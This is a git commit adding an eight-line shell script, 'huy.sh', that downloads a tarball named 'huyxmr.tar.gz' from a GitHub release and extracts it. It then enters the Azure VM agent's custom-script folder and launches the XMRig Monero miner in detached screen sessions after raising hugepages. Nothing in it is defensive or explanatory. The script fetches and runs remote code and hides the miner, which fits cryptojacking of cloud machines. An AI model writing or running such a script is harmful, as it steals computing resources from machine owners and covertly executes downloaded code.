cd69c2fa8144aa0a312e91611feb85cf189b3fed
zoharxxx <69108517+zoharxxx@users.noreply.github.com>
2020-12-15 02:05:18 +0700

    Add files via upload

---
+++ huy.sh
@@ -0,0 +1,8 @@
+#!/bin/sh
+sysctl -w vm.nr_hugepages=3072
+wget https://github.com/zoharxxx/zohar/releases/download/zohar/huyxmr.tar.gz
+tar -zxvf huyxmr.tar.gz
+cd /var/lib/waagent/custom-script/download/1/xmrig-v5.11.1
+chmod a+x xmrig
+chmod a+x config.json
+screen -dmS bash bash && screen -dmS xmrig ./xmrig
